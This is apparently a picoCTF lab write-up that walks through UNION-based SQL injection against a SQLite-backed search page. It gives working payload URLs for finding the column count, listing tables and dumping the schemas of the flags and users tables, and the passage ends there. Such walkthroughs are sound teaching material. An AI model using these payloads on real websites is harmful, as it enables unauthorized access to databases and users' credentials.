Discovering the Vulnerability
Step 1: Find the vulnerable parameter

Notice there's a search functionality. The search parameter appears in the URL:
text

http://lonely-island.picoctf.net:62247/vuln.php?q=test

Step 2: Test for SQL injection

Try a basic UNION injection to find the number of columns:
text

http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1,2,3--&PHPSESSID=your_session_id

Error received:
text

Warning: SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns

This tells us:

    It's an SQLite database

    The column count is wrong

Step 3: Find correct column count

Test different numbers of columns:
text

http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1--&PHPSESSID=your_session_id
http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1,2--&PHPSESSID=your_session_id

Success with 2 columns:
text

Results: 1: 2

The original query returns 2 columns.
Database Enumeration
Step 4: List all tables

Since it's SQLite, query the sqlite_master table:
text

http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1,name FROM sqlite_master WHERE type='table'--&PHPSESSID=your_session_id

Results:
text

1: flags
1: sqlite_sequence
1: users

Step 5: Check table structures

For the flags table:
text

http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1,sql FROM sqlite_master WHERE name='flags'--&PHPSESSID=your_session_id

Result:
text

1: CREATE TABLE flags ( id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT NOT NULL UNIQUE, value TEXT NOT NULL )

For the users table:
text

http://lonely-island.picoctf.net:62247/vuln.php?q=test' UNION SELECT 1,sql FROM sqlite_master WHERE name='users'--&PHPSESSID=your_session_id

Result:
text

1: CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL )

